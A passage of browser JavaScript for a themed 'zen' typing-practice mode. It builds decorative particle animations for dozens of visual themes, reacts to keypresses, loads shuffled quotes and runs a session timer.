                    // Burst: explode a full firework from random position
                    const fwContainer = document.getElementById('zen-particles');
                    if (fwContainer) {
                        const cx = 15 + Math.random() * 70;
                        const cy = 15 + Math.random() * 60;
                        const fwHue = Math.random() * 360;
                        const petals = 12 + Math.floor(Math.random() * 8);
                        for (let b = 0; b < petals; b++) {
                            const fw = document.createElement('div');
                            fw.className = 'zen-firework';
                            const sz = 3 + Math.random() * 5;
                            const angle = (b / petals) * Math.PI * 2;
                            const dist = 60 + Math.random() * 120;
                            fw.style.width = sz + 'px';
                            fw.style.height = sz + 'px';
                            fw.style.top = cy + '%';
                            fw.style.left = cx + '%';
                            fw.style.background = `hsl(${fwHue + b * 15},100%,70%)`;
                            fw.style.boxShadow = `0 0 ${sz * 3}px hsl(${fwHue},100%,70%)`;
                            fw.style.transition = `transform ${0.5 + Math.random() * 0.4}s ease-out, opacity 0.8s ease-in`;
                            fw.style.opacity = '1';
                            fwContainer.appendChild(fw);
                            requestAnimationFrame(() => {
                                fw.style.transform = `translate(${Math.cos(angle) * dist}px, ${Math.sin(angle) * dist}px) scale(0.2)`;
                                fw.style.opacity = '0';
                            });
                            setTimeout(() => fw.remove(), 1000);
                        }
                    }
                } else if (theme === 'evergreen') {
                    // Puff: swell the mist
                    document.querySelectorAll('.zen-mist').forEach(p => {
                        if (Math.random() > 0.5) {
                            p.style.transition = 'transform 0.3s ease-out, opacity 0.3s';
                            p.style.transform = 'scaleX(2) scaleY(1.5)';
                            p.style.opacity = '0.8';
                            setTimeout(() => { p.style.transform = ''; p.style.opacity = ''; p.style.transition = 'transform 1s, opacity 1s'; }, 300);
                        }
                    });
                } else if (theme === 'golden-curtain') {
                    // Ripple: send a shimmer wave through curtains
                    document.querySelectorAll('.zen-curtain').forEach((p, i) => {
                        setTimeout(() => {
                            p.style.transition = 'transform 0.2s ease-out, opacity 0.2s';
                            p.style.transform = 'scaleX(1.4)';
                            p.style.opacity = '0.9';
                            setTimeout(() => { p.style.transform = ''; p.style.opacity = ''; p.style.transition = 'transform 0.6s, opacity 0.6s'; }, 200);
                        }, i * 20);
                    });
                } else if (theme === 'permafrost') {
                    // Shatter: ice shards briefly spin and brightness-spike
                    document.querySelectorAll('.zen-ice').forEach(p => {
                        if (Math.random() > 0.4) {
                            p.style.transition = 'transform 0.1s, filter 0.1s';
                            p.style.transform = `scale(1.6) rotate(${Math.random() * 90}deg)`;
                            p.style.filter = 'brightness(4) saturate(0)';
                            setTimeout(() => { p.style.transform = ''; p.style.filter = ''; p.style.transition = 'transform 0.8s, filter 0.8s'; }, 120);
                        }
                    });
                } else if (theme === 'mountain-fog') {
                    // Roll: slowly billow all fog patches outward
                    document.querySelectorAll('.zen-fog').forEach(p => {
                        p.style.transition = 'transform 2s ease-out, opacity 1s';
                        p.style.transform = `scale(${1.3 + Math.random() * 0.5})`;
                        p.style.opacity = '0.2';
                        setTimeout(() => { p.style.transform = ''; p.style.opacity = ''; p.style.transition = 'transform 3s, opacity 3s'; }, 2000);
                    });
                } else if (theme === 'prism-break') {
                    // Scatter: random prism orbs jump to new positions with hue spike
                    document.querySelectorAll('.zen-prism').forEach(p => {
                        if (Math.random() > 0.4) {
                            p.style.transition = 'transform 0.15s ease-out, filter 0.15s';
                            p.style.transform = `scale(2) translateX(${(Math.random() - 0.5) * 60}px)`;
                            p.style.filter = 'brightness(3)';
                            setTimeout(() => { p.style.transform = ''; p.style.filter = ''; p.style.transition = 'transform 0.6s, filter 0.6s'; }, 150);
                        }
                    });
                } else if (theme === 'shadow-realm') {
                    // Shrink then explode outward
                    document.querySelectorAll('.zen-shadow').forEach(p => {
                        p.style.transition = 'transform 0.15s ease-in, opacity 0.15s';
                        p.style.transform = 'scale(0.2)';
                        p.style.opacity = '0.8';
                        setTimeout(() => {
                            p.style.transition = 'transform 0.8s cubic-bezier(0.2, 1.5, 0.5, 1), opacity 0.6s';
                            p.style.transform = 'scale(2.5)';
                            p.style.opacity = '0.1';
                        }, 150);
                    });
                } else if (theme === 'enchanted-garden') {
                    document.querySelectorAll('.zen-garden-leaf').forEach(p => {
                        const currentTx = parseFloat(p.dataset.tx || 0);
                        const newTx = currentTx + (20 + Math.random() * 30);
                        p.dataset.tx = newTx;
                        p.style.transform = `translateX(${newTx}px) rotate(${Math.random() * 180}deg)`;
                    });
                } else if (theme === 'tidal-wave') {
                    document.querySelectorAll('.zen-tide').forEach(p => {
                        p.style.transition = 'transform 0.5s ease-out, opacity 0.5s';
                        p.style.transform = `translateY(-${40 + Math.random() * 60}px) scaleX(1.5)`;
                        p.style.opacity = '0.4';
                        setTimeout(() => { p.style.transform = ''; p.style.opacity = ''; p.style.transition = 'transform 2s, opacity 2s'; }, 500);
                    });
                } else if (theme === 'plasma-storm') {
                    document.querySelectorAll('.zen-plasma').forEach(p => {
                        if (Math.random() > 0.3) {
                            p.style.transition = 'filter 0.1s, transform 0.2s';
                            p.style.filter = 'brightness(4) hue-rotate(90deg)';
                            p.style.transform = `translate(${(Math.random() - 0.5) * 100}px, ${(Math.random() - 0.5) * 100}px) scale(1.8)`;
                            setTimeout(() => { p.style.filter = ''; p.style.transform = ''; p.style.transition = 'filter 0.6s, transform 1s'; }, 150);
                        }
                    });
                } else if (theme === 'butterfly') {
                    document.querySelectorAll('.zen-butterfly').forEach(p => {
                        if (Math.random() > 0.4) {
                            p.style.transition = 'transform 0.3s cubic-bezier(0.1, 1.5, 0.5, 1)';
                            p.style.transform = `translate(${(Math.random() - 0.5) * 150}px, ${-(50 + Math.random() * 100)}px) rotate(${Math.random() * 30 - 15}deg)`;
                            setTimeout(() => { p.style.transform = ''; p.style.transition = 'transform 2s ease-in-out'; }, 300);
                        }
                    });
                } else if (theme === 'nebula') {
                    document.querySelectorAll('.zen-nebula-cloud').forEach(p => {
                        p.style.transition = 'filter 0.2s, opacity 0.2s';
                        p.style.filter = 'brightness(2.5) saturate(2)';
                        p.style.opacity = '0.5';
                        setTimeout(() => { p.style.filter = ''; p.style.opacity = ''; p.style.transition = 'filter 1s, opacity 1s'; }, 200);
                    });
                }
            }
        };
        document.addEventListener('keydown', zenState._typeHandler);

        // ESC to exit, TAB to skip to next quote
        if (zenState._escHandler) document.removeEventListener('keydown', zenState._escHandler);
        zenState._escHandler = function (e) {
            if (e.key === 'Escape' && zenState.active) {
                exitZenGarden();
            } else if (e.key === 'Tab' && zenState.active) {
                e.preventDefault();
                // Fade out current quote and load next
                const bufferWrap = document.querySelector('.zen-buffer-wrap');
                if (bufferWrap) {
                    bufferWrap.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
                    bufferWrap.style.opacity = '0';
                    bufferWrap.style.transform = 'translateY(-8px)';
                    setTimeout(() => {
                        loadNextZenQuote();
                        bufferWrap.style.opacity = '1';
                        bufferWrap.style.transform = 'translateY(0)';
                    }, 300);
                } else {
                    loadNextZenQuote();
                }
            }
        };
        document.addEventListener('keydown', zenState._escHandler);
    }

    function loadNextZenQuote() {
        if (zenState.contentIndex >= zenState.shuffled.length) {
            zenState.shuffled = [...zenGardenContent].sort(() => Math.random() - 0.5);
            zenState.contentIndex = 0;
        }

        const quote = zenState.shuffled[zenState.contentIndex];
        zenState.contentIndex++;

        codingState.currentCode = quote.text;
        codingState.charIndex = 0;
        codingState.correct = 0;
        codingState.total = 0;

        const sourceEl = document.getElementById('zen-source');
        if (sourceEl) {
            sourceEl.style.opacity = '0';
            setTimeout(() => {
                sourceEl.textContent = '\u2014 ' + quote.author;
                sourceEl.style.opacity = '1';
            }, 300);
        }

        renderCodeBuffer(quote.text, 'zen-buffer', 'text');
        initTypingEngine('zen-buffer', 'zen-input', () => {
            // Quote complete — fade and load next
            const bufferWrap = document.querySelector('.zen-buffer-wrap');
            if (bufferWrap) {
                bufferWrap.style.opacity = '0';
                bufferWrap.style.transform = 'translateY(-8px)';
                setTimeout(() => {
                    loadNextZenQuote();
                    bufferWrap.style.opacity = '1';
                    bufferWrap.style.transform = 'translateY(0)';
                }, 600);
            } else {
                loadNextZenQuote();
            }
        });

        if (!zenState.startTime) zenState.startTime = Date.now();
    }

    function startZenTimer() {
        if (zenState.timerInterval) clearInterval(zenState.timerInterval);
        zenState.timerInterval = setInterval(() => {
            if (!zenState.startTime) return;
            const elapsed = Math.floor((Date.now() - zenState.startTime) / 1000);
            const mins = Math.floor(elapsed / 60);
            const secs = (elapsed % 60).toString().padStart(2, '0');
            const timeEl = document.getElementById('zen-time');
            if (timeEl) timeEl.textContent = mins + ':' + secs;

            // Glow and stillness labels intensify over time using CSS vars on the board
            const board = document.getElementById('coding-zen-board');
            if (board) {
                const glowAlpha = Math.min(0.12, 0.04 + (elapsed / 1800) * 0.08);
                board.style.setProperty('--zen-glow-alpha', glowAlpha);

                const stillAlpha = Math.min(0.6, 0.3 + (elapsed / 600) * 0.3);
                board.style.setProperty('--zen-still-alpha', stillAlpha);
            }
        }, 1000);
    }

    function startZenParticles() {
        const container = document.getElementById('zen-particles');
        if (!container) return;
        container.innerHTML = '';

        const themeConfig = {
            'spring-rain': { cls: 'zen-raindrop', count: 40 },
            'autumn-drift': { cls: 'zen-leaf', count: 25 },
            'midnight-snow': { cls: 'zen-snow', count: 60 },
            'sakura-blossom': { cls: 'zen-sakura', count: 35 },
            'stardust': { cls: 'zen-star', count: 80 },
            'abyssal-depths': { cls: 'zen-bubble', count: 30 },
            'ember-glow': { cls: 'zen-ember', count: 45 },
            'synthwave-grid': { cls: 'zen-synth', count: 15 },
            'fireflies': { cls: 'zen-firefly', count: 35 },
            'desert-sand': { cls: 'zen-sand', count: 100 },
            'quantum-float': { cls: 'zen-quantum', count: 20 },
            'golden-hour': { cls: 'zen-gold-dust', count: 40 },
            'neon-rain': { cls: 'zen-neon-streak', count: 60 },
            'coral-reef': { cls: 'zen-coral', count: 35 },
            'aurora-borealis': { cls: 'zen-aurora', count: 18 },
            'lava-drip': { cls: 'zen-lava', count: 25 },
            'void-whisper': { cls: 'zen-void', count: 22 },
            'crystal-cave': { cls: 'zen-crystal', count: 28 },
            'monsoon': { cls: 'zen-monsoon-drop', count: 80 },
            'bioluminescence': { cls: 'zen-bio', count: 30 },
            'galactic-drift': { cls: 'zen-nebula', count: 16 },
            'ink-drop': { cls: 'zen-ink', count: 20 },
            'candlelight': { cls: 'zen-candle-flame', count: 30 },
            'tesla-coil': { cls: 'zen-spark', count: 18 },
            'deep-current': { cls: 'zen-current', count: 25 },
            'mushroom-spores': { cls: 'zen-spore', count: 35 },
            'saturn-ring': { cls: 'zen-ring-particle', count: 60 },
            'meteor-shower': { cls: 'zen-meteor', count: 50 },
            'tornado': { cls: 'zen-debris', count: 35 },
            'blood-moon': { cls: 'zen-blood-drop', count: 30 },
            'fireworks': { cls: 'zen-firework', count: 8 },
            'evergreen': { cls: 'zen-mist', count: 30 },
            'golden-curtain': { cls: 'zen-curtain', count: 25 },
            'permafrost': { cls: 'zen-ice', count: 20 },
            'mountain-fog': { cls: 'zen-fog', count: 12 },
            'prism-break': { cls: 'zen-prism', count: 40 },
            'shadow-realm': { cls: 'zen-shadow', count: 18 },
            'enchanted-garden': { cls: 'zen-garden-leaf', count: 30 },
            'tidal-wave': { cls: 'zen-tide', count: 15 },
            'plasma-storm': { cls: 'zen-plasma', count: 12 },
            'butterfly': { cls: 'zen-butterfly', count: 14 },
            'nebula': { cls: 'zen-nebula-cloud', count: 10 },
            'zen-ripples': { cls: 'zen-ripple', count: 15 },
            'celestial-map': { cls: 'zen-constellation', count: 50 },
            'volcanic-ash': { cls: 'zen-ash', count: 60 },
            'pixel-rain': { cls: 'zen-pixel', count: 80 },
            'astral-rings': { cls: 'zen-astral', count: 12 },
            'solar-winds': { cls: 'zen-solar-particle', count: 60 }
        };

        const config = themeConfig[zenState.theme] || themeConfig['autumn-drift'];

        for (let i = 0; i < config.count; i++) {
            const particle = document.createElement('div');
            particle.className = config.cls;

            // Common resets for physics
            particle.dataset.tx = 0;
            particle.dataset.ty = 0;
            particle.dataset.rot = 0;

            const x = Math.random() * 100;
            const y = Math.random() * 100;
            const scale = 0.5 + Math.random() * 0.8;
            const dur = 3 + Math.random() * 7;
            const delay = Math.random() * 10;

            if (zenState.theme === 'spring-rain') {
                particle.style.left = x + '%';
                particle.style.height = (15 + Math.random() * 25) + 'px';
                particle.style.animationDuration = (2 + Math.random() * 2) + 's';
                particle.style.animationDelay = delay + 's';
                particle.style.opacity = 0.15 + Math.random() * 0.25;
            } else if (zenState.theme === 'synthwave-grid' || zenState.theme === 'quantum-float') {
                particle.style.left = x + '%';
                particle.style.top = y + '%';
                particle.style.animationDelay = delay + 's';
                if (zenState.theme === 'synthwave-grid') {
                    const size = (15 * scale);
                    particle.style.width = size + 'px';
                    particle.style.height = size + 'px';
                    particle.style.animationDuration = dur + 5 + 's';
                }
            } else if (zenState.theme === 'fireflies' || zenState.theme === 'golden-hour' || zenState.theme === 'stardust') {
                particle.style.left = x + '%';
                particle.style.top = y + '%';
                particle.style.animationDelay = delay + 's';
                particle.style.animationDuration = dur + 's';
            } else if (zenState.theme === 'abyssal-depths') {
                particle.style.left = x + '%';
                const animDur = dur + 2;
                // Use negative delay to pre-spread particles across screen height from spawn
                // so they don't all start at bottom: -20px and surge as a wave on first keypress
                const preOffset = -(Math.random() * animDur);
                particle.style.animationDelay = preOffset + 's';
                particle.style.animationDuration = animDur + 's';
                const size = (8 * scale);
                particle.style.width = size + 'px';
                particle.style.height = size + 'px';
                // Also stagger starting ty for physics calcs
                particle.dataset.ty = -(Math.random() * 200);
            } else if (zenState.theme === 'ember-glow') {
                particle.style.left = x + '%';
                const animDur = dur + 2;
                // Positive delay so embers visibly rise from the bottom when first entering the theme
                const staggerDelay = Math.random() * animDur;
                particle.style.animationDelay = staggerDelay + 's';
                particle.style.animationDuration = animDur + 's';
                const size = (3 * scale);
                particle.style.width = size + 'px';
                particle.style.height = size + 'px';
                particle.dataset.ty = 0;
            } else {
                particle.style.left = x + '%';
                particle.style.animationDuration = dur + 's';
                particle.style.animationDelay = delay + 's';

                if (zenState.theme === 'autumn-drift' || zenState.theme === 'sakura-blossom') {
                    particle.style.width = (24 * scale) + 'px';
                    particle.style.height = (24 * scale) + 'px';
                    particle.style.opacity = 0.4 + Math.random() * 0.5;
                } else if (zenState.theme === 'desert-sand') {
                    const sandDur = 1 + Math.random();
                    particle.style.animationDuration = sandDur + 's';
                    particle.style.top = (Math.random() * 100) + '%';
                    particle.style.animationDelay = -(Math.random() * sandDur) + 's';
                } else if (zenState.theme === 'neon-rain') {
                    // Each streak: random cyan→magenta color, random height, random speed
                    const hue = Math.random() < 0.5 ? '180' : (Math.random() < 0.5 ? '300' : '120');
                    const nLen = 30 + Math.random() * 80;
                    const nDur = 0.4 + Math.random() * 1.2;
                    particle.style.height = nLen + 'px';
                    particle.style.background = `linear-gradient(to bottom, transparent, hsl(${hue},100%,60%), transparent)`;
                    particle.style.boxShadow = `0 0 4px hsl(${hue},100%,70%)`;
                    particle.style.animationDuration = nDur + 's';
                    particle.style.animationDelay = -(Math.random() * nDur) + 's';
                    particle.style.opacity = '0.7';
                } else if (zenState.theme === 'coral-reef') {
                    const coralColors = [
                        'rgba(255,120,80,0.7)', 'rgba(255,200,80,0.7)',
                        'rgba(80,220,200,0.7)', 'rgba(255,80,160,0.7)',
                        'rgba(100,200,255,0.7)'
                    ];
                    const sz = 6 + Math.random() * 16;
                    const coralDur = 4 + Math.random() * 6;
                    particle.style.width = sz + 'px';
                    particle.style.height = sz + 'px';
                    particle.style.background = coralColors[Math.floor(Math.random() * coralColors.length)];
                    particle.style.boxShadow = `0 0 ${sz * 1.5}px ${particle.style.background}`;
                    particle.style.animationDuration = coralDur + 's';
                    particle.style.animationDelay = -(Math.random() * coralDur) + 's';
                } else if (zenState.theme === 'aurora-borealis') {
                    const aw = 80 + Math.random() * 200;
                    const ah = 20 + Math.random() * 60;
                    const auroraDur = 5 + Math.random() * 10;
                    const hue = 140 + Math.random() * 120;
                    particle.style.width = aw + 'px';
                    particle.style.height = ah + 'px';
                    particle.style.top = (Math.random() * 70) + '%';
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.background = `radial-gradient(ellipse, hsla(${hue},100%,65%,0.35) 0%, transparent 70%)`;
                    particle.style.filter = `blur(${4 + Math.random() * 8}px)`;
                    particle.style.animationDuration = auroraDur + 's';
                    particle.style.animationDelay = -(Math.random() * auroraDur) + 's';
                } else if (zenState.theme === 'lava-drip') {
                    const lw = 6 + Math.random() * 14;
                    const lh = lw * (1.2 + Math.random());
                    const lavaDur = 1.5 + Math.random() * 2.5;
                    const lavaHue = Math.random() < 0.6 ? 15 : 0;
                    particle.style.width = lw + 'px';
                    particle.style.height = lh + 'px';
                    particle.style.background = `radial-gradient(ellipse at 40% 30%, hsl(${lavaHue + 40},100%,70%), hsl(${lavaHue},100%,40%), hsl(${lavaHue - 10},80%,20%))`;
                    particle.style.animationDuration = lavaDur + 's';
                    particle.style.animationDelay = -(Math.random() * lavaDur) + 's';
                } else if (zenState.theme === 'void-whisper') {
                    const vsz = 30 + Math.random() * 90;
                    const vDur = 4 + Math.random() * 8;
                    const vx = (Math.random() - 0.5) * 160;
                    const vy = (Math.random() - 0.5) * 120;
                    particle.style.width = vsz + 'px';
                    particle.style.height = vsz + 'px';
                    particle.style.top = (20 + Math.random() * 60) + '%';
                    particle.style.left = (10 + Math.random() * 80) + '%';
                    particle.style.setProperty('--vx', vx + 'px');
                    particle.style.setProperty('--vy', vy + 'px');
                    particle.style.animationDuration = vDur + 's';
                    particle.style.animationDelay = -(Math.random() * vDur) + 's';
                } else if (zenState.theme === 'crystal-cave') {
                    const csz = 10 + Math.random() * 28;
                    const cDur = 3 + Math.random() * 6;
                    const cHue = 180 + Math.random() * 120;
                    particle.style.width = csz + 'px';
                    particle.style.height = csz * (1.5 + Math.random()) + 'px';
                    particle.style.top = (10 + Math.random() * 80) + '%';
                    particle.style.left = (5 + Math.random() * 90) + '%';
                    particle.style.background = `linear-gradient(135deg, hsla(${cHue},100%,85%,0.7), hsla(${cHue + 40},80%,60%,0.4), hsla(${cHue + 80},100%,80%,0.6))`;
                    particle.style.boxShadow = `0 0 10px hsla(${cHue},100%,80%,0.5), 0 0 20px hsla(${cHue + 60},100%,60%,0.3)`;
                    particle.style.animationDuration = cDur + 's';
                    particle.style.animationDelay = -(Math.random() * cDur) + 's';
                } else if (zenState.theme === 'monsoon') {
                    const mLen = 20 + Math.random() * 60;
                    const mDur = 0.3 + Math.random() * 0.6;
                    particle.style.height = mLen + 'px';
                    particle.style.animationDuration = mDur + 's';
                    particle.style.animationDelay = -(Math.random() * mDur) + 's';
                    particle.style.opacity = (0.3 + Math.random() * 0.5).toString();
                } else if (zenState.theme === 'bioluminescence') {
                    const bioColors = [
                        'radial-gradient(circle, rgba(0,255,160,0.6) 0%, transparent 70%)',
                        'radial-gradient(circle, rgba(0,200,255,0.6) 0%, transparent 70%)',
                        'radial-gradient(circle, rgba(100,255,80,0.6) 0%, transparent 70%)',
                        'radial-gradient(circle, rgba(160,0,255,0.4) 0%, transparent 70%)'
                    ];
                    const bsz = 8 + Math.random() * 30;
                    const bDur = 3 + Math.random() * 6;
                    const bRiseDur = 6 + Math.random() * 10;
                    particle.style.width = bsz + 'px';
                    particle.style.height = bsz + 'px';
                    particle.style.background = bioColors[Math.floor(Math.random() * bioColors.length)];
                    particle.style.boxShadow = `0 0 ${bsz}px rgba(0,255,160,0.4)`;
                    particle.style.animationDuration = `${bDur}s, ${bRiseDur}s`;
                    particle.style.animationDelay = `${-(Math.random() * bDur)}s, ${-(Math.random() * bRiseDur)}s`;
                } else if (zenState.theme === 'galactic-drift') {
                    const gsz = 60 + Math.random() * 180;
                    const gDur = 8 + Math.random() * 15;
                    const gHue = Math.random() < 0.5 ? (260 + Math.random() * 60) : (180 + Math.random() * 60);
                    const nx = (Math.random() - 0.5) * 200;
                    const ny = (Math.random() - 0.5) * 150;
                    particle.style.width = gsz + 'px';
                    particle.style.height = gsz + 'px';
                    particle.style.top = (Math.random() * 90) + '%';
                    particle.style.left = (Math.random() * 90) + '%';
                    particle.style.background = `radial-gradient(ellipse, hsla(${gHue},80%,60%,0.25) 0%, hsla(${gHue + 40},60%,40%,0.1) 50%, transparent 80%)`;
                    particle.style.filter = `blur(${6 + Math.random() * 12}px)`;
                    particle.style.setProperty('--nx', nx + 'px');
                    particle.style.setProperty('--ny', ny + 'px');
                    particle.style.animationDuration = gDur + 's';
                    particle.style.animationDelay = -(Math.random() * gDur) + 's';
                } else if (zenState.theme === 'ink-drop') {
                    const inkColors = [
                        'radial-gradient(circle, rgba(30,30,50,0.9) 0%, transparent 70%)',
                        'radial-gradient(circle, rgba(60,40,80,0.7) 0%, transparent 70%)',
                        'radial-gradient(circle, rgba(0,20,40,0.8) 0%, transparent 70%)'
                    ];
                    const isz = 20 + Math.random() * 60;
                    const iDur = 1.5 + Math.random() * 2.5;
                    particle.style.width = isz + 'px';
                    particle.style.height = isz + 'px';
                    particle.style.top = (10 + Math.random() * 80) + '%';
                    particle.style.left = (5 + Math.random() * 90) + '%';
                    particle.style.background = inkColors[Math.floor(Math.random() * inkColors.length)];
                    particle.style.animationDuration = iDur + 's';
                    particle.style.animationDelay = -(Math.random() * iDur) + 's';
                } else if (zenState.theme === 'candlelight') {
                    const fw = 4 + Math.random() * 12;
                    const fh = fw * (1.4 + Math.random() * 0.8);
                    const fDur = 0.4 + Math.random() * 0.6;
                    const warmHue = 20 + Math.random() * 20; // orange to yellow
                    particle.style.width = fw + 'px';
                    particle.style.height = fh + 'px';
                    particle.style.top = (30 + Math.random() * 50) + '%';
                    particle.style.left = (5 + Math.random() * 90) + '%';
                    particle.style.background = `radial-gradient(ellipse at 50% 80%, hsl(${warmHue + 10},100%,90%) 0%, hsl(${warmHue},100%,65%) 40%, hsl(${warmHue - 15},90%,35%) 80%, transparent 100%)`;
                    particle.style.boxShadow = `0 0 ${fw * 2}px hsl(${warmHue},100%,60%), 0 0 ${fw * 5}px hsl(${warmHue - 10},100%,40%)`;
                    particle.style.animationDuration = fDur + 's';
                    particle.style.animationDelay = -(Math.random() * fDur) + 's';
                } else if (zenState.theme === 'tesla-coil') {
                    const ssz = 3 + Math.random() * 8;
                    const sDur = 0.5 + Math.random() * 1.5;
                    const angle = Math.random() * Math.PI * 2;
                    const dist = 80 + Math.random() * 180;
                    const sx = Math.cos(angle) * dist;
                    const sy = Math.sin(angle) * dist;
                    const sparkColors = ['rgba(120,180,255,0.9)', 'rgba(200,230,255,0.9)', 'rgba(80,120,255,0.9)', 'rgba(255,255,255,1)'];
                    particle.style.width = ssz + 'px';
                    particle.style.height = ssz + 'px';
                    // All sparks originate near dead center
                    particle.style.top = (45 + Math.random() * 10) + '%';
                    particle.style.left = (45 + Math.random() * 10) + '%';
                    particle.style.background = sparkColors[Math.floor(Math.random() * sparkColors.length)];
                    particle.style.boxShadow = `0 0 ${ssz * 3}px rgba(120,200,255,0.8)`;
                    particle.style.setProperty('--sx', sx + 'px');
                    particle.style.setProperty('--sy', sy + 'px');
                    particle.style.animationDuration = sDur + 's';
                    particle.style.animationDelay = -(Math.random() * sDur) + 's';
                } else if (zenState.theme === 'deep-current') {
                    const csz = 15 + Math.random() * 50;
                    const cDur = 6 + Math.random() * 10;
                    const angle = (Math.random() - 0.5) * 0.8; // mostly horizontal
                    const speed = 60 + Math.random() * 120;
                    const cx = Math.cos(angle) * speed;
                    const cy = Math.sin(angle) * speed - 20;
                    const depthHue = 200 + Math.random() * 40;
                    particle.style.width = csz + 'px';
                    particle.style.height = csz * 0.6 + 'px';
                    particle.style.top = (Math.random() * 90) + '%';
                    particle.style.left = (Math.random() * 90) + '%';
                    particle.style.background = `radial-gradient(ellipse, hsla(${depthHue},80%,55%,0.4) 0%, transparent 70%)`;
                    particle.style.filter = `blur(${2 + Math.random() * 4}px)`;
                    particle.style.setProperty('--cx', cx + 'px');
                    particle.style.setProperty('--cy', cy + 'px');
                    particle.style.animationDuration = cDur + 's';
                    particle.style.animationDelay = -(Math.random() * cDur) + 's';
                } else if (zenState.theme === 'mushroom-spores') {
                    const msz = 3 + Math.random() * 10;
                    const mDur = 4 + Math.random() * 8;
                    const mWobble = 1.5 + Math.random() * 2;
                    const sporeColors = [
                        `rgba(180,255,120,0.7)`, `rgba(220,255,80,0.6)`,
                        `rgba(120,255,180,0.6)`, `rgba(255,220,80,0.5)`
                    ];
                    particle.style.width = msz + 'px';
                    particle.style.height = msz + 'px';
                    particle.style.background = sporeColors[Math.floor(Math.random() * sporeColors.length)];
                    particle.style.boxShadow = `0 0 ${msz * 2}px rgba(180,255,120,0.5)`;
                    particle.style.animationDuration = `${mDur}s, ${mWobble}s`;
                    particle.style.animationDelay = `${-(Math.random() * mDur)}s, ${-(Math.random() * mWobble)}s`;
                    particle.style.left = (5 + Math.random() * 90) + '%';
                } else if (zenState.theme === 'saturn-ring') {
                    const ringCount = 3; // 3 distinct rings
                    const ring = Math.floor(Math.random() * ringCount);
                    const radii = [80, 130, 180];
                    const ringColors = [
                        `rgba(220,180,100,0.6)`, `rgba(200,160,120,0.5)`, `rgba(180,140,80,0.4)`
                    ];
                    const rsz = 3 + Math.random() * 5;
                    const rDur = (8 + ring * 4 + Math.random() * 4);
                    particle.style.width = rsz + 'px';
                    particle.style.height = rsz + 'px';
                    particle.style.background = ringColors[ring];
                    particle.style.boxShadow = `0 0 ${rsz * 2}px ${ringColors[ring]}`;
                    particle.style.setProperty('--ro', radii[ring] + 'px');
                    particle.style.animationDuration = rDur + 's';
                    particle.style.animationDelay = -(Math.random() * rDur) + 's';
                } else if (zenState.theme === 'meteor-shower') {
                    const mw = 1 + Math.random() * 2;
                    const mLen = 40 + Math.random() * 120;
                    const mDur = 2.5 + Math.random() * 1.5;
                    const mHue = 200 + Math.random() * 60;
                    particle.style.width = mw + 'px';
                    particle.style.height = mLen + 'px';
                    particle.style.left = (Math.random() * 120 - 20) + '%';
                    particle.style.background = `linear-gradient(to bottom, hsla(${mHue},100%,90%,0), hsla(${mHue},100%,80%,0.9), white)`;
                    particle.style.boxShadow = `0 0 4px white`;
                    particle.style.animationDuration = mDur + 's';
                    particle.style.animationDelay = -(Math.random() * mDur) + 's';
                } else if (zenState.theme === 'tornado') {
                    const dsz = 3 + Math.random() * 10;
                    const dDur = 1.5 + Math.random() * 3;
                    const tx = (Math.random() - 0.5) * 200;
                    const ty = -(60 + Math.random() * 160);
                    const debrisColors = ['rgba(160,150,140,0.8)', 'rgba(120,110,100,0.7)', 'rgba(180,170,150,0.6)', 'rgba(80,80,70,0.9)'];
                    particle.style.width = dsz + 'px';
                    particle.style.height = dsz * (0.3 + Math.random()) + 'px';
                    particle.style.top = (30 + Math.random() * 40) + '%';
                    particle.style.left = (30 + Math.random() * 40) + '%';
                    particle.style.background = debrisColors[Math.floor(Math.random() * debrisColors.length)];
                    particle.style.setProperty('--tx', tx + 'px');
                    particle.style.setProperty('--ty', ty + 'px');
                    particle.style.animationDuration = dDur + 's';
                    particle.style.animationDelay = -(Math.random() * dDur) + 's';
                } else if (zenState.theme === 'blood-moon') {
                    const bw = 4 + Math.random() * 10;
                    const bh = bw * (1.5 + Math.random());
                    const bDur = 2 + Math.random() * 4;
                    const bHue = Math.random() > 0.8 ? 15 : 0; // mostly red, occasional orange
                    particle.style.width = bw + 'px';
                    particle.style.height = bh + 'px';
                    particle.style.background = `radial-gradient(ellipse at 40% 20%, hsl(${bHue + 10},100%,70%) 0%, hsl(${bHue},100%,35%) 60%, hsl(${bHue - 5},80%,15%) 100%)`;
                    particle.style.boxShadow = `0 0 ${bw}px rgba(200,20,20,0.6)`;
                    particle.style.animationDuration = bDur + 's';
                    particle.style.animationDelay = -(Math.random() * bDur) + 's';
                } else if (zenState.theme === 'fireworks') {
                    // Seed particle at random position — real bursts spawn on keypress
                    const fwsz = 2 + Math.random() * 4;
                    particle.style.width = fwsz + 'px';
                    particle.style.height = fwsz + 'px';
                    particle.style.top = (10 + Math.random() * 80) + '%';
                    particle.style.left = (5 + Math.random() * 90) + '%';
                    particle.style.background = `hsl(${Math.random() * 360},100%,70%)`;
                    particle.style.animationDuration = (2 + Math.random() * 4) + 's';
                    particle.style.animationDelay = -(Math.random() * 4) + 's';
                } else if (zenState.theme === 'evergreen') {
                    const esz = 10 + Math.random() * 40;
                    const eDur = 5 + Math.random() * 8;
                    const eWobble = 1.5 + Math.random() * 2;
                    const greenHue = 110 + Math.random() * 40;
                    particle.style.width = esz + 'px';
                    particle.style.height = esz * 0.5 + 'px';
                    particle.style.background = `radial-gradient(ellipse, hsla(${greenHue},80%,55%,0.5) 0%, transparent 70%)`;
                    particle.style.filter = `blur(${2 + Math.random() * 4}px)`;
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.animationDuration = `${eDur}s, ${eWobble}s`;
                    particle.style.animationDelay = `${-(Math.random() * eDur)}s, ${-(Math.random() * eWobble)}s`;
                } else if (zenState.theme === 'golden-curtain') {
                    const cw = 2 + Math.random() * 8;
                    const cLen = 80 + Math.random() * 200;
                    const cDur = 3 + Math.random() * 5;
                    const warmHue = 40 + Math.random() * 20;
                    particle.style.width = cw + 'px';
                    particle.style.height = cLen + 'px';
                    particle.style.left = (Math.random() * 100) + '%';
                    particle.style.background = `linear-gradient(to bottom, transparent, hsla(${warmHue},100%,65%,0.7), hsla(${warmHue - 10},90%,45%,0.4), transparent)`;
                    particle.style.boxShadow = `0 0 ${cw * 3}px hsla(${warmHue},100%,60%,0.3)`;
                    particle.style.animationDuration = cDur + 's';
                    particle.style.animationDelay = -(Math.random() * cDur) + 's';
                } else if (zenState.theme === 'permafrost') {
                    const isz = 10 + Math.random() * 30;
                    const iDur = 3 + Math.random() * 6;
